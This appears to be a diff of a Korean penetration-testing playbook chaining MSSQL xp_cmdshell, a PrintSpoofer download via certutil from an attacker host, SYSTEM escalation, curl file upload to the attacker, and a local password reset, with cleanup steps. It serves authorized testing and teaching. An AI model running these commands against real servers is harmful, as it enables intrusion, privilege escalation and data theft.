@@ -27,7 +27,7 @@ tags:
 
 ## 시나리오 개요
 
-유효한 MSSQL 로그인으로 서버 역할을 확인하고 `xp_cmdshell`에서 SQL Server 서비스 계정과 `SeImpersonatePrivilege`를 식별한다. HTTP로 PrintSpoofer를 반입해 SYSTEM 명령 실행을 검증한 뒤, 필요한 경우 로컬 사용자 비밀번호를 임시로 재설정하고 `smbclient`로 지정 파일을 회수한다.
+유효한 MSSQL 로그인으로 서버 역할을 확인하고 `xp_cmdshell`에서 SQL Server 서비스 계정과 `SeImpersonatePrivilege`를 식별한다. HTTP로 PrintSpoofer를 반입해 SYSTEM 명령 실행을 검증한 뒤, 먼저 HTTP 직접 회수 또는 이미 보유한 SMB 자격 증명을 선택한다. 로컬 사용자 비밀번호 재설정은 두 경로가 불가능하고 영향·복구가 승인된 경우에만 마지막으로 사용한다.
 
 ## 기준 구조
 
@@ -37,8 +37,8 @@ Linux 공격 호스트
     -> SQL Server 서비스 계정의 xp_cmdshell
       -> HTTP로 PrintSpoofer 반입
         -> SYSTEM 명령 실행
-          -> 로컬 계정 임시 비밀번호 재설정
-            -> SMB C$에서 지정 파일 회수
+          -> HTTP 직접 회수 또는 기존 SMB 자격 증명
+            -> (마지막 수단) 임시 비밀번호 재설정 후 SMB C$ 회수
 ```
 
 ## 시작 상태
@@ -58,9 +58,10 @@ Linux 공격 호스트
 | 1 | Linux 공격 호스트 | [[DB 인증과 데이터 열거]] | MSSQL login과 `sysadmin` 여부 | xp_cmdshell 실행 |
 | 2 | MSSQL 프롬프트 | [[MSSQL xp_cmdshell 명령 실행]] | SQL Server 서비스 계정과 `SeImpersonatePrivilege Enabled` | PrintSpoofer 반입 |
 | 3 | Linux 공격 호스트와 MSSQL 프롬프트 | [[Certutil로 Windows HTTP 파일 반입]] | HTTP GET, 파일 생성과 hash 일치 | SYSTEM 검증 |
-| 4 | MSSQL 프롬프트 | [[PrintSpoofer로 SeImpersonatePrivilege 권한 상승]] | `CreateProcessAsUser() OK`, `nt authority\system` | 필요한 로컬 변경 선택 |
-| 5 | SYSTEM 명령 실행 | [[로컬 사용자 비밀번호 재설정]] | 임시 로컬 비밀번호와 인증 성공 | SMB 파일 회수 |
-| 6 | Linux 공격 호스트 | [[SMB 인증 공유 파일 수집]] | `getting file`과 로컬 파일 | 내용 확인 후 복구 |
+| 4 | MSSQL 프롬프트 | [[PrintSpoofer로 SeImpersonatePrivilege 권한 상승]] | `CreateProcessAsUser() OK`, `nt authority\system` | 회수 경로 선택 |
+| 5 | SYSTEM 명령 실행 | HTTP 직접 회수 또는 기존 SMB 인증을 먼저 검증 | 수신 HTTP 요청 또는 기존 계정의 share 접근 | 필요할 때만 비밀번호 변경 검토 |
+| 6 | SYSTEM 명령 실행 | [[로컬 사용자 비밀번호 재설정]] | 임시 로컬 비밀번호와 인증 성공 | 두 안전 경로가 불가하고 변경이 정당화된 경우만 SMB 회수 |
+| 7 | Linux 공격 호스트 | [[SMB 인증 공유 파일 수집]] | `getting file`과 로컬 파일 | 내용 확인 후 복구 |
 
 ## 1. MSSQL 인증과 서버 역할 확인
 
@@ -79,6 +80,12 @@ SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
 
 `impacket-mssqlclient`의 `SQL>` 프롬프트에서는 셸 명령 뒤에 Windows 명령을 따옴표 없이 입력한다.
 
+먼저 두 설정의 `value_in_use`를 기록한다. `enable_xp_cmdshell`로 바뀐 설정만 나중에 원래 값으로 되돌린다.
+
+```sql
+SQL> SELECT name, value, value_in_use FROM sys.configurations WHERE name IN ('show advanced options','xp_cmdshell');
+```
+
 ```text
 SQL> enable_xp_cmdshell
 SQL> xp_cmdshell hostname
@@ -95,37 +102,57 @@ Linux 공격 호스트에서 원본 hash를 기록하고 HTTP 서버를 연다.
 ```bash
 cd <SERVE_DIRECTORY>
 sha256sum PrintSpoofer64.exe
-python3 -m http.server <HTTP_PORT> --bind <ATTACKER_IP>
+ss -ltnp | grep -E '[:.]<HTTP_PORT>[[:space:]]'
+python3 -m http.server <HTTP_PORT> --bind <ATTACKER_IP> &
+HTTP_SERVER_PID=$!
+ps -p "$HTTP_SERVER_PID" -o pid=,args=
 ```
 
 MSSQL 프롬프트에서 대상 파일을 내려받고 hash를 확인한다.
 
 ```text
-SQL> xp_cmdshell certutil.exe -f -urlcache -split http://<ATTACKER_IP>:<HTTP_PORT>/PrintSpoofer64.exe C:\Windows\Temp\PrintSpoofer64.exe
-SQL> xp_cmdshell certutil.exe -hashfile C:\Windows\Temp\PrintSpoofer64.exe SHA256
+SQL> xp_cmdshell if exist "<PRINTSPOOFER_PATH>" (echo EXISTS) else (echo ABSENT)
+SQL> xp_cmdshell certutil.exe -f -urlcache -split http://<ATTACKER_IP>:<HTTP_PORT>/PrintSpoofer64.exe <PRINTSPOOFER_PATH>
+SQL> xp_cmdshell certutil.exe -hashfile <PRINTSPOOFER_PATH> SHA256
 ```
 
-HTTP 로그의 GET, CertUtil 완료 메시지와 송수신 SHA-256 일치를 모두 확인한다.
+작업 전 `ABSENT`인 고유한 `<PRINTSPOOFER_PATH>`만 사용한다. HTTP 로그의 GET, CertUtil 완료 메시지와 송수신 SHA-256 일치를 모두 확인한다.
 
 ## 4. SYSTEM 명령 실행 검증
 
 ```text
-SQL> xp_cmdshell C:\Windows\Temp\PrintSpoofer64.exe -c "cmd /c whoami"
+SQL> xp_cmdshell <PRINTSPOOFER_PATH> -c "cmd /c whoami"
 ```
 
 `Found privilege: SeImpersonatePrivilege`, `CreateProcessAsUser() OK`와 `nt authority\system`이 함께 있어야 성공이다.
 
-## 5. 필요한 경우에만 로컬 사용자 비밀번호 재설정
+## 5. 회수 경로를 먼저 선택
 
-SYSTEM 명령은 이미 확보했지만 SMB 파일 회수에 사용할 로컬 자격 증명이 없고, 비밀번호 변경 영향을 감수할 필요가 있을 때만 수행한다.
+SYSTEM 명령으로 읽을 수 있는 지정 파일은 먼저 공격 호스트의 HTTP 수신기로 직접 회수한다. 대상에서 공격 호스트로 나가는 HTTP가 가능하다는 것은 도구 반입 단계에서 이미 확인했으므로, 추가 계정 변경 없이 같은 경로를 재사용할 수 있다.
 
 ```text
-SQL> xp_cmdshell C:\Windows\Temp\PrintSpoofer64.exe -c "cmd /c net user <LOCAL_USER> <TEMP_PASSWORD>"
+SQL> xp_cmdshell <PRINTSPOOFER_PATH> -c "cmd /c curl.exe --upload-file <REMOTE_FILE> http://<ATTACKER_IP>:<HTTP_PORT>/<COLLECTION_PATH>"
+```
+
+이 명령은 공격 호스트의 수신 endpoint가 HTTP `PUT` 업로드를 지원할 때만 사용한다. 단순 `python3 -m http.server`는 파일 수신을 지원하지 않는다. 수신 endpoint가 없으면 파일 읽기 성공만 확인하고, 기존에 보유한 SMB 자격 증명과 공유 권한을 먼저 검증한다.
+
+```bash
+smbclient //<SQL_TARGET>/<SHARE> -W <WORKGROUP_OR_DOMAIN> -U '<EXISTING_USER>%<EXISTING_PASSWORD>' -c 'get <REMOTE_PATH> <LOCAL_FILE>'
+```
+
+`getting file`은 share 접근과 해당 파일 READ가 모두 성공했음을 뜻한다. 인증 성공만으로 `C$` 접근이나 파일 READ를 단정하지 않는다.
+
+## 6. 마지막 수단: 로컬 사용자 비밀번호 재설정
+
+SYSTEM 명령은 확보했지만 HTTP 직접 회수와 기존 SMB 자격 증명 경로가 모두 불가능하고, 비밀번호 변경의 영향·복구 방법을 기록한 경우에만 수행한다.
+
+```text
+SQL> xp_cmdshell <PRINTSPOOFER_PATH> -c "cmd /c net user <LOCAL_USER> <TEMP_PASSWORD>"
 ```
 
 `The command completed successfully.`는 로컬 SAM 비밀번호 변경 완료다. 도메인 계정 비밀번호 변경으로 해석하지 않는다.
 
-## 6. SMB로 지정 파일 회수
+## 7. 변경한 자격 증명으로 SMB 회수
 
 ```bash
 smbclient //<SQL_TARGET>/C$ -W WORKGROUP -U '<LOCAL_USER>%<TEMP_PASSWORD>' -c 'cd Users\<TARGET_USER>\Desktop; get <REMOTE_FILE> <LOCAL_FILE>'
@@ -137,30 +164,84 @@ smbclient //<SQL_TARGET>/C$ -W WORKGROUP -U '<LOCAL_USER>%<TEMP_PASSWORD>' -c 'c
 
 | 실패 지점·출력 | 먼저 확인할 것 | 다음 경로 |
 |---|---|---|
-| MSSQL login 실패 | SQL·Windows 인증 방식, 인스턴스·포트 | [[1433_MSSQL]] |
+| MSSQL login 실패 | SQL·Windows 인증 방식, 인스턴스·포트 | [[MSSQL 서비스]] |
 | `enable_xp_cmdshell` 거부 | 현재 login의 `sysadmin`, IMPERSONATE·linked server | [[MSSQL Impersonation 권한 상승]] 또는 [[MSSQL Linked Server 내부 이동]] |
 | `SeImpersonatePrivilege` 없음·Disabled | 현재 OS 계정과 token | [[Windows 권한 상승 열거]] |
 | HTTP GET 없음 | listener bind, 공격 호스트 주소·포트와 egress | [[상황별 파일 전송]] |
 | PrintSpoofer 프로세스 생성 실패 | build·arch·token·실행 차단 | [[PrintSpoofer로 SeImpersonatePrivilege 권한 상승]]의 오류 단계 확인 |
+| HTTP 직접 회수 불가 | 수신 서버의 파일 수신 지원, egress 정책과 승인된 전송 방법 | 기존 SMB 자격 증명 또는 승인된 다른 회수 경로 확인 |
 | SMB timeout | 피벗·SOCKS·445/TCP route | [[내부망 경로 확보 후 피벗 구성]] |
 | SMB 인증 성공 후 `C$` 거부 | 로컬 관리자 멤버십·UAC 원격 제한·share ACL | 일반 공유 또는 다른 파일 회수 경로 확인 |
 
 ## 변경 영향과 복구
 
-| 변경 대상 | 복구 절차 |
-|---|---|
-| `xp_cmdshell`·advanced options | 변경 전 값이 `0`이었던 설정만 [[MSSQL xp_cmdshell 명령 실행]]의 절차로 복구 |
-| PrintSpoofer 파일 | `del C:\Windows\Temp\PrintSpoofer64.exe` |
-| 로컬 사용자 비밀번호 | 원래 값을 아는 경우 `net user <LOCAL_USER> <ORIGINAL_PASSWORD>`; 모르면 자동 원복 불가 |
-| HTTP 서버 | 파일 반입 완료 후 Python HTTP 서버 종료 |
+SQL 연결과 SYSTEM 명령 경로가 살아 있을 때 대상 계정·파일·cache·설정을 먼저 처리하고, 마지막에 공격 호스트 listener와 SQL 연결을 닫는다. 선택하지 않은 회수 분기의 자원은 만들거나 삭제하지 않는다.
+
+### 1. 파일 회수 결과와 로컬 비밀번호 상태 확정
+
+`smbclient`와 HTTP 업로드 연결을 먼저 종료하고 공격 호스트의 exact `<LOCAL_FILE>` 또는 승인된 수신 파일의 크기·hash를 확인한다. 이는 공격 목표의 결과물이므로 자동 삭제하지 않고 증적 보존·민감 자료 폐기 정책에 따른다.
+
+로컬 비밀번호를 변경했다면 PrintSpoofer와 SQL 연결이 살아 있을 때 [[로컬 사용자 비밀번호 재설정]]의 기준으로 먼저 처리한다.
+
+```text
+SQL> xp_cmdshell <PRINTSPOOFER_PATH> -c "cmd /c net user <LOCAL_USER> <ORIGINAL_PASSWORD>"
+SQL> xp_cmdshell net user <LOCAL_USER>
+```
+
+원래 비밀번호를 알고 정책상 재사용할 수 있는 경우에만 첫 명령을 실행한다. 명령 성공과 승인된 인증 경로를 따로 확인한다. 원래 값을 모르면 자동 원복할 수 없으며, 관리자 재설정과 서비스·예약 작업·자동 로그온 갱신이 끝날 때까지 `관리자 복구 인계`다.
+
+### 2. PrintSpoofer 파일과 certutil cache 정리
+
+작업 전 없었던 exact 파일과 이번 다운로드 URL의 cache 항목만 처리한다.
+
+```text
+SQL> xp_cmdshell certutil.exe -urlcache http://<ATTACKER_IP>:<HTTP_PORT>/PrintSpoofer64.exe delete
+SQL> xp_cmdshell del "<PRINTSPOOFER_PATH>"
+SQL> xp_cmdshell if exist "<PRINTSPOOFER_PATH>" (echo EXISTS) else (echo ABSENT)
+```
+
+마지막 출력이 `ABSENT`여야 파일 정리가 끝난 것이다. 삭제 실패 시 파일을 사용하는 프로세스, SQL Server service account의 삭제 권한과 방어 제품 격리 상태를 먼저 확인한다. 이름이 비슷한 Temp 파일을 일괄 삭제하지 않는다.
+
+### 3. MSSQL 설정 복원
+
+같은 SQL session에서 [[MSSQL xp_cmdshell 명령 실행]]의 절차로 변경 전 `value_in_use`가 `0`이었던 설정만 되돌린다. `show advanced options`가 원래 `1`이면 `xp_cmdshell`만 비활성화한다. 복원 뒤 두 값을 다시 조회해 기준선과 대조한다.
+
+```sql
+SQL> SELECT name, value, value_in_use FROM sys.configurations WHERE name IN ('show advanced options','xp_cmdshell');
+```
+
+query를 확인하기 전에 SQL 연결이 끊기면 설정 복구는 미확인 상태다.
+
+### 4. 공격 호스트 listener와 연결 종료
+
+대상 측 정리가 끝난 뒤 기록한 Python HTTP server PID만 종료하고 포트가 작업 전 상태로 돌아왔는지 확인한다.
+
+```bash
+ps -p <HTTP_SERVER_PID> -o pid=,args=
+kill <HTTP_SERVER_PID>
+ps -p <HTTP_SERVER_PID> -o pid=,args=
+ss -ltnp | grep -E '[:.]<HTTP_PORT>[[:space:]]'
+```
+
+HTTP `PUT` 수신기를 별도로 사용했다면 그 실행에서 기록한 exact listener ID·PID로 같은 순서로 종료한다. 마지막에 `impacket-mssqlclient`를 종료한다. listener나 SQL 연결을 먼저 닫아 대상 파일·비밀번호·설정을 확인하지 못했으면 전체 복구 완료로 기록하지 않는다.
 
 ## 완료 기준
 
+### 공격 목표
+
 - MSSQL login·DB 역할과 Windows 실행 계정을 구분했다.
 - PrintSpoofer 자식 명령에서 `nt authority\system`을 확인했다.
-- SMB `get`으로 지정 파일을 공격 호스트에 회수했다.
-- 변경한 MSSQL 설정·도구 파일·로컬 계정 비밀번호의 복구 상태를 확인했다.
+- HTTP 직접 회수, 기존 SMB 인증 또는 정당화된 임시 비밀번호 변경 중 선택한 경로로 지정 파일을 공격 호스트에 회수하고 hash를 확인했다.
 
+### 복구 상태
+
+- `완료`: 로컬 비밀번호 변경 분기를 사용하지 않았고, PrintSpoofer 파일·certutil cache, MSSQL 설정, HTTP listener를 기준선과 대조했다.
+- `제한적`: 비밀번호를 한 번이라도 변경했거나 이미 끊긴 세션·감사 기록 또는 보존 중인 민감 회수 파일이 있으며 담당자·보존 위치·후속 조치가 확인됐다. 원래 평문으로 다시 설정했더라도 비밀번호 이력, 기존 세션과 감사 기록은 되돌릴 수 없으므로 `완료`로 올리지 않는다.
+- `미확인`: SQL 또는 SYSTEM 경로가 먼저 끊겨 대상 파일·비밀번호·설정 중 하나라도 확인하지 못했다. 파일 회수에 성공했더라도 복구 완료로 쓰지 않는다.
+
+
+## 참고 링크
+- [Microsoft: xp_cmdshell](https://learn.microsoft.com/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16), [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer), [Microsoft: curl](https://learn.microsoft.com/windows-server/administration/windows-commands/curl)
 ## 관련 도구
 
 - [[impacket-mssqlclient]]
